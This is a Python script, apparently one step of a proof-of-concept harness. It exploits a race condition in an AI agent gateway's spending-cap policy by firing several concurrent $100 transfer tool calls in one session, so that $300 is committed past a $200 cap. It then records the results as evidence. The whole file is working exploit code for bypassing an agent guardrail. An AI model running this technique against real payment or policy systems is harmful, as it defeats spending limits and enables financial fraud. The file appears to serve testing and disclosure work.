# -*- coding: utf-8 -*-
"""30_fire_parallel.py -- fire 3 parallel $100 transfers in ONE policy session.

This is the exploit.  The buggy policy sums only SETTLED (::response)
transfers over the last 24h, so at decision time the in-flight parallel
fires are invisible to the sum.  Three concurrent $100 authorized fires
therefore all pass `sum <= 200`, and $300 gets committed -- over the cap.

Implementation notes
--------------------
* One session id (uuid4) is shared by all three invokes: temporal counts are
  per-session (new session = fresh count), so the three fires must share the
  session to be counted against one another.
* The three invokes are started back-to-back (Popen) so they are genuinely
  in flight together -- that is the race the buggy policy cannot see.
* Each invoke goes through the official AgentCore CLI (SigV4 with the local
  AWS credentials profile); responses are saved to out/fire-*.json.
* The MCP path is /mcp (JSON-RPC tools/call); /tools/call is retried if the
  CLI rejects the path.

Expected (buggy policy):  3 ADMITTED, 0 DENIED, $300 committed (> cap 200)
Usage:  python 30_fire_parallel.py [amount] [nfires]   (defaults 100, 3)
"""

import json
import os
import subprocess
import sys
import time
import uuid

import common as C

DEFAULT_TOOL_NAME = "TransferTarget___transfer"
PATHS = ["/mcp", "/", "/tools/call"]
CAP = 200


def tool_name(st):
    return (st.get("toolName") or DEFAULT_TOOL_NAME).strip()


def mcp_path(st):
    return st.get("mcpPath") or PATHS[0]


def jsonrpc_payload(n, amount, tool):
    return json.dumps({
        "jsonrpc": "2.0",
        "id": n,
        "method": "tools/call",
        "params": {
            "name": tool,
            "arguments": {"amount": amount},
        },
    })


def start_invoke(gw_id, sid, n, path, amount, outfile, tool):
    cmd = C.gateway_invoke_cmd(gw_id, path, "POST",
                               jsonrpc_payload(n, amount, tool),
                               outfile, session_id=sid)
    C.log("$ " + " ".join(cmd[:8]) + " ...")
    return subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)


def wait_invoke(p, timeout=120):
    t0 = time.time()
    try:
        out, err = p.communicate(timeout=timeout)
        rc = p.returncode
    except subprocess.TimeoutExpired:
        p.kill()
        out, err = p.communicate()
        rc = -1
        err = b"TIMEOUT"
    return rc, out.decode("utf-8", "replace"), err.decode("utf-8", "replace"), \
        time.time() - t0


def classify(rc, outfile, out_text, err_text):
    """Classify a gateway response as ADMITTED / DENIED / UNKNOWN.

    rc==0 means the gateway let the tool run (admitted).  A policy denial
    surfaces as a non-2xx (403) whose body/CLI error text mentions the
    denial.
    """
    body = ""
    if outfile and os.path.exists(outfile):
        try:
            with open(outfile, "r", errors="replace") as f:
                body = f.read()
        except Exception:
            body = ""
    blob = ((body or "") + " " + (out_text or "") + " " + (err_text or "")).lower()
    if rc == 0:
        return "ADMITTED"
    if any(m in blob for m in ("denied", "denial", "403", "forbidden",
                               "accessdenied", "permissiondenied")):
        return "DENIED"
    return "UNKNOWN"


def looks_like_notfound(results):
    blob = " ".join((r.get("stdout_tail", "") + r.get("stderr_tail", ""))
                    for r in results).lower()
    return any(m in blob for m in ("not found", "404", "no such tool",
                                   "unknown tool", "invalid path",
                                   "tool not found"))


def fire_all(gw_id, sid, path, tool, amount, nfires):
    """Fire ``nfires`` parallel invokes on ``path``; return result list."""
    started = []
    t0 = time.time()
    for i in range(1, nfires + 1):
        outfile = os.path.join(C.OUT_DIR, "fire-%d.json" % i)
        p = start_invoke(gw_id, sid, i, path, amount, outfile, tool)
        started.append((i, p, outfile))
    C.log("fired %d parallel invokes on %s (%.3fs spread)"
          % (len(started), path, time.time() - t0))
    results = []
    for (i, p, outfile) in started:
        rc, out, err, dt = wait_invoke(p)
        verdict = classify(rc, outfile, out, err)
        results.append({
            "fire": i, "session_id": sid, "amount": amount,
            "path": path, "tool": tool,
            "exit_code": rc, "verdict": verdict, "elapsed_s": round(dt, 3),
            "stdout_tail": (out or "")[-800:],
            "stderr_tail": (err or "")[-800:],
            "response_file": outfile,
        })
        print("  fire %d : %-9s rc=%s (%.2fs)" % (i, verdict, rc, dt))
    return results


def main():
    amount = 100
    nfires = 3
    if len(sys.argv) > 1:
        amount = int(sys.argv[1])
    if len(sys.argv) > 2:
        nfires = int(sys.argv[2])

    st = C.load_state()
    gw_id = st.get("gatewayId")
    if not gw_id:
        C.die("run 10_setup.py first (missing gatewayId in state)")
    tool = tool_name(st)
    path0 = mcp_path(st)

    session_id = str(uuid.uuid4())
    print("=" * 68)
    print("30_fire_parallel -- %d parallel $%d transfers, ONE session"
          % (nfires, amount))
    print("  gateway : %s" % st.get("gatewayArn"))
    print("  session : %s" % session_id)
    print("  path    : %s   tool: %s" % (path0, tool))
    print("  cap     : %d (24h window)" % CAP)
    print("=" * 68)

    C.ensure_out()
    candidates = [path0] + [p for p in PATHS if p != path0]
    results = None
    for idx, path in enumerate(candidates):
        print("\n-- invoking on path %s" % path)
        results = fire_all(gw_id, session_id, path, tool, amount, nfires)
        if not looks_like_notfound(results):
            break
        if idx + 1 < len(candidates):
            print("  [fallback] path %s looks wrong; trying %s"
                  % (path, candidates[idx + 1]))
        else:
            print("  (no more candidate paths)")

    admitted = [r for r in results if r["verdict"] == "ADMITTED"]
    denied = [r for r in results if r["verdict"] == "DENIED"]
    committed = sum(r["amount"] for r in admitted)
    print("\n" + "-" * 68)
    print("  ADMITTED : %d fire(s), $%d committed" % (len(admitted), committed))
    print("  DENIED   : %d fire(s)" % len(denied))
    if admitted and committed > CAP:
        print("  *** RACE CONFIRMED: $%d committed > $%d cap ***"
              % (committed, CAP))
    print("-" * 68)

    C.write_json("fire-results.json", {
        "phase": st.get("phase") or "buggy",
        "session_id": session_id,
        "amount": amount, "nfires": nfires,
        "path": results[0]["path"], "tool": tool,
        "fired_at_utc": C.now_iso(),
        "results": results,
        "admitted_count": len(admitted),
        "denied_count": len(denied),
        "committed_usd": committed,
    })
    C.save_state({
        "lastSessionId": session_id,
        "fireResultsFile": "fire-results.json",
        "mcpPath": results[0]["path"],
    })
    print("\nNext: python 40_capture_evidence.py")


if __name__ == "__main__":
    main()